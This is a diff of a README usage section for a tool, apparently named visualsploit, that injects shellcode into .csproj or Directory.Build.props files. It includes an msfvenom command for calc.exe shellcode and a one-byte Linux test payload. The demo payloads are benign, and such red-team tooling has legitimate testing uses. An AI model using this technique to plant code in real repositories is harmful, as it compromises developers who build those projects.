@@ -1,14 +1,17 @@
 # Examples
 
-`calc.bin` is a small x64 shellcode that launches `calc.exe`. Generated with:
+Generate a Windows x64 sample that launches Calculator:
 
 ```bash
 msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o calc.bin
+visualsploit Sample.csproj calc.bin -s 42 --platform windows
 ```
 
-Usage:
+Generate a Linux smoke test payload that returns immediately:
 
 ```bash
-visualsploit Sample.csproj calc.bin -s 42
-visualsploit path/to/repo/Directory.Build.props calc.bin
+printf '\303' > ret.bin
+visualsploit Sample.csproj ret.bin -s 42 --platform linux
 ```
+
+Use `Directory.Build.props` instead of `Sample.csproj` to target every project below a directory.
